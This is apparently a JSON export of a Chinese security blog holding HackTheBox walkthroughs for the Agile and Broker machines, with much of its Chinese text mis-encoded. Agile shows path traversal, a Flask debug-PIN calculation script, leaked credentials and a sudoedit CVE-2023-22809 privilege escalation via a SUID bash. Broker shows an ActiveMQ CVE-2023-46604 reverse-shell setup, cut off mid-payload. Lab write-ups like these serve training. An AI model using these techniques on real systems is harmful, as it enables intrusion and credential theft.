{"pages":[{"title":"","text":"","link":"/links/index.html"},{"title":"","text":"about me Whoami : zIxyd Contact : Mjk3MjkxNDY5Mg== CTF: WEB/PWN Skill : å†…ç½‘æ¸—é€ï¼ŒADåŸŸ æ¹–å—æŸæœ¬ç§‘å­¦æ ¡ç„å¤©ç½‘å®‰å®éªŒå®¤ä¸»åŠ›é˜Ÿå‘˜ï¼Œä¸“æ³¨äºç½‘ç»œå®‰å…¨çš„æŠ€æœ¯çˆ±å¥½è€…ï¼›çƒ­è¡·äºè®°å½•å®æˆ˜ç»éªŒã€åˆ†äº«å·¥å…·ä¸æŠ€æœ¯ï¼Œè‡´åŠ›äºæŒç»­å­¦ä¹ ä¸æˆé•¿ï¼›ä¸€åä¸“æ³¨çš„ HackTheBox ç©å®¶ï¼Œæˆªæ­¢2025.7æœˆåœ¨ä¸­å›½ç©å®¶ä¸­æ’å27","link":"/about/index.html"}],"posts":[{"title":"Agile(HTB)","text":"ä¿¡æ¯æœé›†12345678910111213141516171819202122232425262728â”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$ sudo nmap -p- -min-rate 10000 10.10.11.203Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-25 10:50 CSTNmap scan report for superpass.htb (10.10.11.203)Host is up (0.091s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpNmap done: 1 IP address (1 host up) scanned in 6.87 seconds â”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$ sudo nmap -sT -sV -sC -O -p80 10.10.11.203Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-25 10:52 CSTNmap scan report for superpass.htb (10.10.11.203)Host is up (0.12s latency).PORT STATE SERVICE VERSION80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: SuperPassword \\xF0\\x9F\\xA6\\xB8Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel å¯¹ç›®å½•ï¼Œå’Œå­åŸŸåæœé›†æ— æœåï¼Œç›´æ¥è®¿é—®80; æ–‡ä»¶è¯»å–éšæ„æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œå¹¶ç™»å½•ï¼›åœ¨/vaultä¸‹æœ‰ä¸€ä¸ªè®°å½•ç”¨æˆ·åå’Œå¯†ç çš„åŠŸèƒ½ï¼Œå¹¶ä¸”å¯ä»¥å¯¼å‡ºï¼Œ â€œå¯¼å‡ºâ€çš„http-headerçš„getè¯·æ±‚ 12GET /download?fn=12345_export_9b398f27c8.csv HTTP/1.1Host: superpass.htb è¿™é‡Œå¹¶ä¸éš¾å‘ç°ï¼Œâ€å¯¼å‡ºâ€åŠŸèƒ½ç‚¹å­˜åœ¨ï¼Œç›®å½•ç©¿è¶Šå¯¼è‡´ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼›å¹¶ä¸”å¯ä»¥çœ‹åˆ°corum,edwards,dev_adminç”¨æˆ·ä½äºâ€/home/â€œä¸‹ï¼› å³ä½¿è¿™é‡Œå­˜åœ¨æ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯ä¸çŸ¥é“æ•æ„Ÿä¿¡æ¯åˆ°è·¯å¾„ç­‰ï¼Œæ— æ³•å¾—åˆ°ç«‹è¶³ç‚¹ï¼› flaskç®—pinç åœ¨æ³¨å†Œç”¨æˆ·æ—¶ï¼Œæœ‰ä¸€ä¸ªflaskçš„æŠ¥é”™ï¼›å¾—çŸ¥ï¼Œè¿™æ˜¯ä¸€ä¸ªflaskåº”ç”¨ï¼›å½“æˆ‘å°è¯•é€šè¿‡æ–‡ä»¶è¯»å–æ‹¿åˆ°flaské»˜è®¤appåº”ç”¨çš„æºç æ˜¯/app/app.pyæ—¶ï¼Œå¹¶æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œçœ‹æ¥è·¯å¾„æ²¡æˆ‘æƒ³åˆ°é‚£ä¹ˆç®€å•ï¼› æˆ‘è¯•ç€çœ‹çœ‹flaskçš„åŠ¨æ€è°ƒè¯•æ˜¯å¦å¼€å¯,è®¿é—®/consoleè·¯å¾„ï¼Œè¿”å›çš„æ˜¯ï¼šâ€404 Not Foundâ€;æˆ‘ä»¥å‰éƒ½æ˜¯è¿™æ ·æŸ¥çœ‹flaskçš„åŠ¨æ€è°ƒè¯•æ˜¯å¦ä¸ºå¼€å¯çŠ¶æ€çš„ï¼›æˆ‘è‡ªä»¥ä¸ºè®¿é—®/consoleæ²¡æœ‰å›æ˜¾å°±æ˜¯åŠ¨æ€è°ƒè¯•ä¸ºå…³é—­ï¼›å®æ—¶è¯æ˜æˆ‘æ˜¯å¤šä¹ˆæ„šè ¢ï¼› åœ¨æŠ¥é”™é¡µé¢ï¼Œç‚¹å‡»å³ä¾§çš„å°çª—å£å³ï¼Œå°±ä¼šå¼¹å‡ºè¦æ±‚è¾“å…¥pinçš„æ¡† æ‰“ctfæ‰“å¤šäº†çš„ï¼Œä¸€ä¸‹å°±æƒ³åˆ°äº†â€æ–‡ä»¶è¯»å–â€+â€pinç â€ï¼›å¾ˆæ˜æ˜¾éœ€è¦æˆ‘ä»¬é€šè¿‡æ–‡ä»¶è¯»å–ä»è€Œè®¡ç®—pinç ï¼› åœ¨hacktricksä¸Šæœ‰ä¸€ç¯‡å…³äºè®¡ç®—pinç çš„æ–‡ç« ï¼Œå€¼å¾—ä¸€çœ‹ï¼› flaskçš„pinç è®¡ç®—ï¼Œæ ¹æ®ç¯å¢ƒå’Œç‰ˆæœ¬çš„ä¸åŒï¼Œè®¡ç®—çš„æ–¹å¼ä¸åŒã€‚æ€ä¹ˆç¡®å®šç”¨é‚£ç§æ–¹å¼å‘¢ï¼Ÿåœ¨è¿™å°é¶æœºä¸­æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ–‡ä»¶è¯»å–æ¥æŸ¥çœ‹è¿™å°æœºå™¨è®¡ç®—pinç çš„æºç  /app/venv/lib/python3.10æ˜¯æ ¹æ®æŠ¥é”™é¡µé¢å¾—åˆ°çš„ï¼Œsite-packages/werkzeug/debug/__init__.pyåˆ™æ˜¯å›ºå®šè·¯å¾„ 1/app/venv/lib/python3.10/site-packages/werkzeug/debug/__init__.py æºç å¤ªé•¿,åªè´´ä¸€éƒ¨åˆ†ï¼Œä»ä¸­å¯ä»¥çœ‹å‡ºæ˜¯ä»¥sha1çš„æ–¹å¼è®¡ç®—çš„ï¼Œæˆ‘ä»¬å¯¹åº”çš„è„šæœ¬ä¹Ÿåº”è¯¥ç”¨sha1; 12345678910probably_public_bits = [ username, modname, getattr(app, &quot;__name__&quot;, type(app).__name__), getattr(mod, &quot;__file__&quot;, None),]private_bits = [str(uuid.getnode()), get_machine_id()]h = hashlib.sha1() username æ˜¯å¯åŠ¨æ­¤FLASKçš„ç”¨æˆ·ï¼›æœ‰ä¸€ä¸ªæ¯”è¾ƒèªæ˜çš„åŠæ³•ï¼Œé€šè¿‡ç¯å¢ƒå˜é‡/proc/self/environï¼Œ å¦‚æœç¯å¢ƒå˜é‡ä¸­æ²¡æœ‰ï¼Œé‚£å°±ä¼°è®¡åªèƒ½æ³„éœ²/etc/passwdä¸€ä¸ªä¸€ä¸ªè¯•äº† modname is flask.app getattr(app, &quot;__name__&quot;, type(app).__name__)è¿™é‡Œçš„ç¬¬ä¸‰ä¸ªå€¼é»˜è®¤çš„Flaskï¼Œä½†æƒ…å†µå¹¶éæ€»æ˜¯å¦‚æ­¤;è€Œæ˜¯â€™wsgi_appâ€™;è¿™ä¸ Flask åœ¨ä¸»æœºä¸Šçš„å¯åŠ¨æ–¹å¼æœ‰å…³ã€‚ è¿™ä¸€ç‚¹å¯ä»¥é€šè¿‡/proc/self/cmdlineï¼›cmdline æ–‡ä»¶å­˜å‚¨ç€å¯åŠ¨å½“å‰è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤ï¼Œä½†åƒµå°¸è¿›ç¨‹ç›®å½•ä¸­çš„æ­¤æ–‡ä»¶ä¸åŒ…å«ä»»ä½•ä¿¡æ¯ã€‚å¯ä»¥é€šè¿‡æŸ¥çœ‹cmdlineç›®å½•è·å–å¯åŠ¨æŒ‡å®šè¿›ç¨‹çš„å®Œæ•´å‘½ä»¤ 1/app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5000 --threads=10 --timeout 600 wsgi:app è¿™ä¸ªå‘½ä»¤çš„æ„æ€æ˜¯ä½¿ç”¨Pythonè™šæ‹Ÿç¯å¢ƒä¸­çš„Python 3è§£é‡Šå™¨æ¥è¿è¡ŒGunicornæœåŠ¡å™¨ï¼Œç»‘å®šåˆ°æœ¬åœ°çš„5000ç«¯å£ï¼Œä½¿ç”¨10ä¸ªçº¿ç¨‹å¤„ç†è¯·æ±‚ï¼Œå¹¶è®¾ç½®è¯·æ±‚è¶…æ—¶æ—¶é—´ä¸º600ç§’ï¼ŒåŒæ—¶è¿è¡Œåä¸ºappçš„WSGIåº”ç”¨ç¨‹åº; getattr(mod, '__file__', None) æ˜¯Flaskç›®å½•ä¸­app.pyçš„ç»å¯¹è·¯å¾„ï¼Œé€šè¿‡æŠ¥é”™é¡µé¢å¾—çŸ¥ï¼› uuid.getnode()æ˜¯å½“å‰è®¡ç®—æœºçš„MACåœ°å€ï¼Œstr(uuid.getnode())æ˜¯macåœ°å€çš„åè¿›åˆ¶è¡¨è¾¾ã€‚ è¦æŸ¥æ‰¾æœåŠ¡å™¨ MAC åœ°å€ï¼Œéœ€è¦çŸ¥é“æ­£åœ¨ä½¿ç”¨å“ªä¸ªç½‘ç»œæ¥å£æ¥ä¸ºåº”ç”¨ç¨‹åºæä¾›æœåŠ¡ï¼ˆä¾‹å¦‚eth0ï¼‰ã€‚å¦‚æœæœªçŸ¥ï¼Œåˆ™æ³„æ¼/proc/net/arpè®¾å¤‡ IDï¼Œç„¶åæ³„æ¼MAC åœ°å€/sys/class/net/&lt;device id&gt;/addressã€‚ 12&gt;&gt;&gt; int(&quot;00:50:56:b9:1e:a9&quot;.replace(&quot;:&quot;,&quot;&quot;),16) 345052356265 get_machine_id()åœ¨æºç ä¸­æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä¸»è¦çš„åŠŸèƒ½æ˜¯æ”¾å›â€/etc/machine-idâ€æˆ–è€…â€/proc/sys/kernel/random/boot_idâ€ä¹‹ä¸­ä¸€ä¸ª(machine-idæ›´ä¼˜å…ˆ)ï¼Œå’Œâ€/proc/self/cgroupâ€çš„å€¼ä»¥/åˆ†å‰²çš„ç¬¬ä¸€ä¸ªæ”¾å›å€¼ï¼Œè¿™ä¸€ç‚¹å¯èƒ½è¡¨è¾¾çš„ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œè‡ªå·±çœ‹çœ‹æºç å°±æ‡‚äº†ï¼› è´´äº†get_machine_id()å‡½æ•°ä¸­çš„ä¸€éƒ¨åˆ†ä»£ç ï¼› 123456789101112131415161718192021for filename in &quot;/etc/machine-id&quot;, &quot;/proc/sys/kernel/random/boot_id&quot;: try: with open(filename, &quot;rb&quot;) as f: value = f.readline().strip() except OSError: continue if value: linux += value break#è¿™é‡Œæœ‰ä¸€ä¸ªbreak,å¦‚æœå¯ä»¥æ‹¿åˆ°&quot;/etc/machine-id&quot;å°±ä¼šé€€å‡ºtry: with open(&quot;/proc/self/cgroup&quot;, &quot;rb&quot;) as f: linux += f.readline().strip().rpartition(b&quot;/&quot;)[2]except OSError: passif linux: return linux 1234567891011121314151617181920212223242526272829303132333435363738394041424344# sha1import hashlibfrom itertools import chainprobably_public_bits = [ 'www-data' 'flask.app', 'wsgi_app', '/app/venv/lib/python3.10/site-packages/flask/app.py' ]private_bits = [ '345052356265', # /sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶ 'ed5b159560f54721827644bc9b220d00superpass.service']h = hashlib.sha1()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv = Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) user-corumå‘ç°æ•æ„Ÿæ–‡ä»¶ï¼Œå…¶å®åœ¨/appç›®å½•ä¸‹ä¹Ÿåªæœ‰config_prod.jsonæ–‡ä»¶å¯¹www-dataå¯è¯» 12cat config_prod.json {&quot;SQL_URI&quot;: &quot;mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass&quot;} ä¼ªç»ˆç«¯ 1python3 -c &quot;import pty;pty.spawn('/bin/bash');&quot; è¿æ¥æ•°æ®åº“ 12mysql -usuperpassuser -p password: dSA6l7q*yIVs$39Ml6ywvgK ä»superpass.passwordsè¡¨ä¸­å‘ç°corumç”¨æˆ·çš„å¯†ç ï¼š5db7caa1d13cc37c9fc2 12ssh corum@10.10.11.203password:5db7caa1d13cc37c9fc2 æƒé™æ£€æŸ¥ 1234corum@agile:~$ sudo -l[sudo] password for corum: Sorry, user corum may not run sudo on agile. Chromeè°ƒè¯•ä»/etc/hostså‘ç°å­åŸŸåâ€test.superpass.htbâ€ 123corum@agile:~$ cat /etc/hosts127.0.0.1 localhost superpass.htb test.superpass.htb127.0.1.1 agile æŸ¥çœ‹å­åŸŸåçš„nginxé…ç½®æ–‡ä»¶ï¼›å®ƒä»…åœ¨æœ¬åœ°ä¸»æœºä¸Šä¾¦å¬ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹ä»£ç†åˆ°æœ¬åœ°ä¸»æœº 5555ã€‚ 1234567891011121314151617corum@agile:/etc/nginx/sites-available$ cat /etc/nginx/sites-available/superpass-test.nginx server { listen 127.0.0.1:80; server_name test.superpass.htb; location /static { alias /app/app-testing/superpass/static; expires 365d; } location / { include uwsgi_params; proxy_pass http://127.0.0.1:5555; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-Protocol $scheme; }} é€šè¿‡sshæœ¬åœ°ç«¯å£è½¬å‘åˆ°kaliæœºä¸Šï¼› 1ssh -L 5555:localhost:5555 corum@superpass.htb è€Œç„¶ï¼Œè¿™å¹¶æ²¡æœ‰å¸®åŠ©ï¼› åœ¨/tests/functional/test_site_interactively.pyæ–‡ä»¶å‘ç°åœ¨åŠ¨æ€è°ƒè¯•seleniumï¼›ä¹‹å‰pythonçˆ¬è™«ç”¨è¿‡selenium; Seleniumæ˜¯ä¸€ä¸ªç”¨äºWebåº”ç”¨ç¨‹åºæµ‹è¯•çš„å·¥å…·ã€‚Seleniumæµ‹è¯•ç›´æ¥è¿è¡Œåœ¨æµè§ˆå™¨ä¸­ï¼Œå°±åƒçœŸæ­£çš„ç”¨æˆ·åœ¨æ“ä½œä¸€æ ·ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485corum@agile:/app/app-testing$ cat ./tests/functional/test_site_interactively.py import osimport pytestimport timefrom selenium import webdriverfrom selenium.webdriver.chrome.options import Optionsfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support.ui import WebDriverWaitwith open('/app/app-testing/tests/functional/creds.txt', 'r') as f: username, password = f.read().strip().split(':') @pytest.fixture(scope=&quot;session&quot;)def driver(): options = Options() #options.add_argument(&quot;--no-sandbox&quot;) options.add_argument(&quot;--window-size=1420,1080&quot;) options.add_argument(&quot;--headless&quot;) options.add_argument(&quot;--remote-debugging-port=41829&quot;) options.add_argument('--disable-gpu') options.add_argument('--crash-dumps-dir=/tmp') driver = webdriver.Chrome(options=options) yield driver driver.close()def test_login(driver): print(&quot;starting test_login&quot;) driver.get('http://test.superpass.htb/account/login') time.sleep(1) username_input = driver.find_element(By.NAME, &quot;username&quot;) username_input.send_keys(username) password_input = driver.find_element(By.NAME, &quot;password&quot;) password_input.send_keys(password) driver.find_element(By.NAME, &quot;submit&quot;).click() time.sleep(3) title = driver.find_element(By.TAG_NAME, &quot;h1&quot;) assert title.text == &quot;Welcome to your vault&quot;def test_add_password(driver): print(&quot;starting test_add_password&quot;) driver.find_element(By.NAME, &quot;add_password&quot;).click() time.sleep(3) site = driver.find_element(By.NAME, &quot;url&quot;) site.send_keys(&quot;test_site&quot;) username = driver.find_element(By.NAME, &quot;username&quot;) username.send_keys(&quot;test_user&quot;) driver.find_element(By.CLASS_NAME, &quot;fa-save&quot;).click() time.sleep(3) assert 'test_site' in driver.page_source assert 'test_user' in driver.page_sourcedef test_del_password(driver): print(&quot;starting test_del_password&quot;) password_rows = driver.find_elements(By.CLASS_NAME, &quot;password-row&quot;) for row in password_rows: if &quot;test_site&quot; == row.find_elements(By.TAG_NAME, &quot;td&quot;)[1].text and \\ &quot;test_user&quot; == row.find_elements(By.TAG_NAME, &quot;td&quot;)[2].text: row.find_element(By.CLASS_NAME, &quot;fa-trash&quot;).click() time.sleep(3) assert 'test_site' not in driver.page_source assert 'test_user' not in driver.page_sourcedef test_title(driver): print(&quot;starting test_title&quot;) driver.get('http://test.superpass.htb') time.sleep(3) assert &quot;SuperPassword ğŸ¦¸&quot; == driver.titledef test_long_running(driver): print(&quot;starting test_long_running&quot;) driver.get('http://test.superpass.htb') time.sleep(550) #time.sleep(5) assert &quot;SuperPasword ğŸ¦¸&quot; == driver.title ä»æ–‡ä»¶ä¸­å‘ç°â€â€“remote-debugging-port=41829â€ 12corum@agile:/app/app-testing$ netstat -ltun|grep 41829tcp 0 0 127.0.0.1:41829 0.0.0.0:* LISTEN æœ¬åœ°ç«¯å£è½¬å‘ 1ssh -L 41829:localhost:41829 corum@superpass.htb æ‰“å¼€ Chromium å¹¶chrome://inspectè½¬åˆ°è®¾å¤‡é¡µé¢ å•å‡»â€œdoneâ€ä¼šæ˜¾ç¤ºä¸€ä¸ªæ–°çš„è¿œç¨‹ç›®æ ‡ï¼š å•å‡»â€œinspectâ€ä¼šå¼¹å‡ºä¸€ä¸ªè¿æ¥åˆ°æµ‹è¯• selenium çš„å¼€å‘å·¥å…·å®ä¾‹ï¼š ä»ä¸­å¯ä»¥å‘ç°â€edwardsâ€ç”¨æˆ·çš„å¯†ç ï¼šâ€d07867c6267dcb5df0afâ€ user-edwards12corum@agile:~$ su edwardsPassword: d07867c6267dcb5df0af æƒé™æ£€æŸ¥ 12345678910edwards@agile:~$ sudo -l[sudo] password for edwards: Matching Defaults entries for edwards on agile: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser edwards may run the following commands on agile: (dev_admin : dev_admin) sudoedit /app/config_test.json (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt å‘ç°å¯ä»¥ç”¨dev_adminç”¨æˆ·çš„sudoeditå‘½ä»¤ç¼–è¾‘ä¸¤ä¸ªæ–‡ä»¶ï¼›è¿™ä¸¤ä¸ªæ–‡ä»¶ä¼¼ä¹å¹¶æ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼› 12345sudo -u dev_admin sudoedit /app/config_test.json{&quot;SQL_URI&quot;:&quot;mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest&quot;} 12sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txtedwards:1d7ffjwrx#$d6qn!9nndqgde4 sudoç‰ˆæœ¬ä»1.8.0åˆ°1.9.12p1ä¹‹é—´å­˜åœ¨CVE-2023-22809 123456edwards@agile:~$ sudo --versionSudo version 1.9.9Sudoers policy plugin version 1.9.9Sudoers file grammar version 48Sudoers I/O plugin version 1.9.9Sudoers audit plugin version 1.9.9 æ­¤æ¼æ´å…è®¸ç”¨æˆ·åœ¨ç”¨æˆ·æä¾›çš„ç¯å¢ƒå˜é‡ä¸­æä¾›é¢å¤–çš„å‚æ•°ï¼Œä»è€Œå…è®¸æ”»å‡»è€…è®¿é—®é…ç½®å…è®¸çš„å…¶ä»–æ–‡ä»¶ä»¥è¿›è¡Œå¤„ç†ã€‚æ­¤å¤„åº”ç”¨å…è®¸ edwards å°†ä»»ä½•æ–‡ä»¶å†™å…¥ dev_adminï¼Œè€Œä¸ä»…ä»…æ˜¯è¿™ä¸¤ä¸ªã€‚ æˆ‘ä»¬åªèƒ½ç¼–è¾‘ä»¥å‰ä½œä¸ºdev_adminæ‰¾åˆ°çš„æ–‡ä»¶ã€‚åœ¨/appä¸­æ‰¾åˆ°çš„test_and_upgrade.sh bashè„šæœ¬æ˜¾ç¤ºäº†ä¸€ä¸ªæœ‰è¶£çš„å‘½ä»¤ï¼Œç‰¹åˆ«source /app/venv/bin/activate 1234567891011121314151617edwards@agile:/app$ cat test_and_update.sh#!/bin/bash# update prod with latest from testing constantly assuming tests are passingecho &quot;Starting test_and_update&quot;date# if already running, exitps auxww | grep -v &quot;grep&quot; | grep -q &quot;pytest&quot; &amp;&amp; exitecho &quot;Not already running. Starting...&quot;# start in dev foldercd /app/app-testing# system-wide source doesn't seem to happen in cron jobssource /app/venv/bin/activate# run tests, exit if failurepytest -x 2&gt;&amp;1 &gt;/dev/null || exit# tests good, update prod (flask debug mode will load it instantly)cp -r superpass /app/app/echo &quot;Complete!&quot; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¯¥æ–‡ä»¶ç”±æ ¹ç›®å½•æ‰€æœ‰ï¼Œç»„å½’dev_adminæ‰€æœ‰ï¼Œåè€…æ‹¥æœ‰ç¼–è¾‘è¯¥æ–‡ä»¶çš„æƒé™ã€‚ 12edwards@agile:~$ ls -al /app/venv/bin/activate-rw-rw-r-- 1 root dev_admin 1976 Aug 5 17:03 /app/venv/bin/activate åˆ©ç”¨CVE-2023-22809å¾€/app/venv/bin/activateå†™æ¶æ„ä»£ç ï¼› 1EDITOR='vim -- /app/venv/bin/activate' sudoedit -u dev_admin /app/config_test.json æ¶æ„ä»£ç å¦‚ä¸‹ï¼› 12cp /bin/bash /tmp/zixydchmod 4777 /tmp/zixyd æœ€åç­‰å‡ åˆ†é’Ÿï¼Œ 12345edwards@agile:~# ls -al /tmp/zixyd-rwsrwxrwx 1 root root 1396520 Jan 25 14:04 /tmp/zixydedwards@agile:~# /tmp/zixyd -pedwards@agile:~# cd /rootedwards@agile:/root#","link":"/2024/01/25/Agile(HTB)/"},{"title":"Broker(HTB)","text":"ä¿¡æ¯æœé›†nmap12345678910111213141516171819â”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$ sudo nmap -p- -min-rate 10000 10.10.11.243 -oA test/nmap [sudo] kali çš„å¯†ç ï¼šStarting Nmap 7.94 ( https://nmap.org ) at 2024-01-27 12:12 CSTNmap scan report for 10.10.11.243 (10.10.11.243)Host is up (0.074s latency).Not shown: 65524 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open http1337/tcp open waste1338/tcp open wmc-log-svc1883/tcp open mqtt5672/tcp open amqp8161/tcp open patrol-snmp44455/tcp open unknown61613/tcp open unknown61614/tcp open unknown61616/tcp open unknown ç«¯å£æ¯”è¾ƒå¤šï¼Œæ•´ç†æ”¾åˆ°å˜é‡ä¸­ï¼Œæ–¹ä¾¿åç»­ä½¿ç”¨ 123456â”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$ ports=$(grep open test/nmap.nmap |awk -F '/' '{print $1}'|paste -sd ',') â”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$ echo $ports22,80,1337,1338,1883,5672,8161,44455,61613,61614,61616 è¿›ä¸€æ­¥è¯¦ç»†æ‰«æ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687â”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$sudo nmap -sT -sV -sC -O -p$ports 10.10.11.243 -oA test/detailsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)|_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Error 401 Unauthorized| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_ basic realm=ActiveMQRealm1337/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: 403 Forbidden1338/tcp open http nginx 1.18.0 (Ubuntu)| http-ls: Volume /| maxfiles limit reached (10)| SIZE TIME FILENAME| - 06-Nov-2023 01:10 bin/| - 06-Nov-2023 01:10 bin/X11/| 963 17-Feb-2020 14:11 bin/NF| 129576 27-Oct-2023 11:38 bin/VGAuthService| 51632 07-Feb-2022 16:03 bin/%5B| 35344 19-Oct-2022 14:52 bin/aa-enabled| 35344 19-Oct-2022 14:52 bin/aa-exec| 31248 19-Oct-2022 14:52 bin/aa-features-abi| 14478 04-May-2023 11:14 bin/add-apt-repository| 14712 21-Feb-2022 01:49 bin/addpart|_|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Index of /1883/tcp open mqtt|_mqtt-subscribe: Failed to receive control packet from server.5672/tcp open amqp?| fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: | AMQP| AMQP| amqp:decode-error|_ 7Connection from client using unsupported AMQP attempted|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 658161/tcp open http Jetty 9.4.39.v20210325| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_ basic realm=ActiveMQRealm|_http-server-header: Jetty(9.4.39.v20210325)|_http-title: Error 401 Unauthorized44455/tcp open tcpwrapped61613/tcp open stomp Apache ActiveMQ| fingerprint-strings: | HELP4STOMP: | ERROR| content-type:text/plain| message:Unknown STOMP action: HELP| org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP| org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)| org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)| org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)| org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)| org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)|_ java.lang.Thread.run(Thread.java:750)61614/tcp open http Jetty 9.4.39.v20210325|_http-server-header: Jetty(9.4.39.v20210325)|_http-title: Site doesn't have a title.| http-methods: |_ Potentially risky methods: TRACE61616/tcp open apachemq ActiveMQ OpenWire transport| fingerprint-strings: | NULL: | ActiveMQ| TcpNoDelayEnabled| SizePrefixDisabled| CacheSize| ProviderName | ActiveMQ| StackTraceEnabled| PlatformDetails | Java| CacheEnabled| TightEncodingEnabled| MaxFrameSize| MaxInactivityDuration| MaxInactivityDurationInitalDelay| ProviderVersion |_ 5.15.15 TCP-80éœ€è¦è®¤è¯ â€œadminâ€/â€œadminâ€œå¼±å¯†ç ã€‚ç™»é™† ActiveMQ çš„ç®¡ç†ç•Œé¢ï¼š å…¶ä¸­æ˜¾ç¤ºäº†ActiveMQçš„ç‰ˆæœ¬å·å€¼å¾—æˆ‘ä»¬ç•™æ„:â€5.15.15â€ user-activemq åœ¨X1r0zå¤§ç¥çš„ä¸€ç¯‡åšå®¢è¡¨æ˜ï¼šApache ActiveMQ (ç‰ˆæœ¬ &lt; 5.18.3) RCE åˆ†æ åœ¨githubä¸Šå¯ä»¥æ‰¾åˆ°ä¸€ç¯‡ä¸é”™çš„poc:CVE-2023-46604 æˆ‘å°†pocå…‹éš†åˆ°æˆ‘æœ¬åœ°ï¼›å¹¶ä¸”å°†poc.xmlçš„ipä»¥åŠç«¯å£æ›´æ”¹ä¸ºæˆ‘çš„æœ¬åœ°ipå’Œåç»§è¦ncçš„ç«¯å£ 12345678910111213141516171819202122232425262728â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/broker/CVE-2023-46604]â””â”€$ ls -al æ€»è®¡ 24drwxr-xr-x 3 kali kali 4096 1æœˆ27æ—¥ 11:51 .drwxr-xr-x 3 kali kali 4096 1æœˆ27æ—¥ 11:49 ..-rw-r--r-- 1 kali kali 1828 1æœˆ27æ—¥ 11:49 exploit.pydrwxr-xr-x 8 kali kali 4096 1æœˆ27æ—¥ 11:49 .git-rw-r--r-- 1 kali kali 666 1æœˆ27æ—¥ 11:51 poc.xml-rw-r--r-- 1 kali kali 2082 1æœˆ27æ—¥ 11:49 README.md â”Œâ”€â”€(kaliã‰¿kali)-[~/htb/machines/broker/CVE-2023-46604]â””â”€$ cat poc.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt; &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; 